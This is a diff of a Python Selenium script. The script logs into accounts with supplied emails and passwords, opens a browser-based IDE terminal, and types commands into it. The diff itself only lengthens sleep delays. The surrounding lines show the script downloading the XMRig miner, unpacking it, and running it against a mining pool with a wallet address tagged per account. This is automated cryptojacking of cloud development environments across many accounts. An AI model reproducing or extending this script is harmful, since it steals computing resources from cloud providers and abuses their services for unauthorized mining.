@@ -87,7 +87,7 @@ def open_browser(instance_number, email, password):
         redirect_uri = query_params.get('redirect_uri', [''])[0]
         gg8 = unquote(redirect_uri)
         driver.get(gg8)
-        time.sleep(30)
+        time.sleep(50)
         print(f"[{email}] url {driver.current_url}")
         actions = ActionChains(driver)
         actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
@@ -108,7 +108,7 @@ def open_browser(instance_number, email, password):
         textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
         textarea1.send_keys(Keys.CONTROL + 'c')
         print(f"{email} SUCCESS CTRL + C")
-        time.sleep(2)
+        time.sleep(3)
         textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:3333 -u ADA:addr1vxt6dj3whefcjhjrycuyh04p22dsyrd9hsdg70eaxya8g5svgl9c0.{email}#uso8-x6ht -p -k --threads=4")
         textarea1.send_keys(Keys.ENTER)
         print(f"{email} SUCCESS EXECUTE COMMAND")
